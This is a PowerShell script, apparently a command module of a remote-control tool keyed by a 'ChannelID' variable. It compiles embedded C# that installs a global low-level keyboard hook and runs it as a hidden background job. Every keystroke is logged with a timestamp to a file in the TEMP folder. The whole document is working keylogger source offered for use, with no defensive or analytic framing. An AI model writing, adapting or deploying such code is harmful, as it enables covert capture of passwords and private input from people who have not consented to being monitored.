param($args)

$channelID = $env:ChannelID
$logFile = "$env:TEMP\keylog_$channelID.txt"
$jobName = "Keylogger_$channelID"

# Check if a job with this name already exists and remove it
Get-Job -Name $jobName -ErrorAction SilentlyContinue | Stop-Job -PassThru | Remove-Job

# C# code for global keyboard hook (simplified, reliable version)
$cSharpCode = @"
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

public class Keylogger
{
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;
    private static string _logFile;
    private static StreamWriter _writer;
    private static Thread _thread;

    public static void Start(string logFile)
    {
        _logFile = logFile;
        _writer = new StreamWriter(logFile, true) { AutoFlush = true };
        _thread = new Thread(Run);
        _thread.SetApartmentState(ApartmentState.STA);
        _thread.Start();
    }

    public static void Stop()
    {
        if (_hookID != IntPtr.Zero)
        {
            UnhookWindowsHookEx(_hookID);
        }
        Application.Exit();
        if (_writer != null)
        {
            _writer.Close();
        }
    }

    private static void Run()
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, _proc,
                GetModuleHandle(curModule.ModuleName), 0);
        }
        Application.Run();
        UnhookWindowsHookEx(_hookID);
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            string keyName = ((Keys)vkCode).ToString();
            _writer.WriteLine($"[{DateTime.Now:HH:mm:ss}] {keyName}");
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook,
        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
        IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
}
"@

# Script block that will run in the background job
$jobScript = {
    param($cSharpCode, $logFile)
    Add-Type -TypeDefinition $cSharpCode -ReferencedAssemblies "System.Windows.Forms"
    [Keylogger]::Start($logFile)
    # Keep the job alive
    while ($true) { Start-Sleep -Seconds 10 }
}

# Start the job
$job = Start-Job -Name $jobName -ScriptBlock $jobScript -ArgumentList $cSharpCode, $logFile

# Save job instance info (optional, for reference)
$job.Id | Out-File "$env:TEMP\keylog_job_$channelID.txt"

Write-Output "Keylogger started with Job ID $($job.Id). Logging to $logFile"